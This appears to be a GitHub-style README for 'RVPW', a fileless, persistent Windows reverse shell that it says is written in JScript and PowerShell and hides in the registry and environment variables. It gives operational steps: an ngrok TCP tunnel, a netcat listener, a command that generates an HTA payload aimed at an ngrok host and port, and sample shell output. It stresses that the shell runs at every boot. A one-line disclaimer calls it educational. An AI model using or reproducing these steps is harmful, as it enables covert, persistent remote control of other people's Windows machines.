# RVPW -misk0zz

# Reverse Shell Persistent Windows (RVPW) persistent reverse shell for windows
This is a fileless living off the land reverse shell written in JScript and Powershell script. It runs every time the windows boots and relies solely on windows registry and environment variables to execute without creating any files on the system<br>
Disclaimer: this program is only for educational purposes

## Reverse shell
In this case I'm using ngrok to make a tcp tunnel:
```
ngrok tcp 3333
```
then we run netcat to listen on port 3333
```
nc -nvlp 3333
```
### creating payload 
Now we can create out payload with our ngrok tunnel's domain and port 
```
python3 generador.py 8.tcp.ngrok.io 18053 payload.hta
```
all you have to do now is to run payload.hta in your windows machine and you get a reverse shell
```
┌─[kali@kali]─[~]
└──╼ $nc -nvlp 3333
listening on [any] 3333 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50662
> echo hello
hello
> 
```
this reverse shell is persistent meaning every time you boot the windows the payload will execute
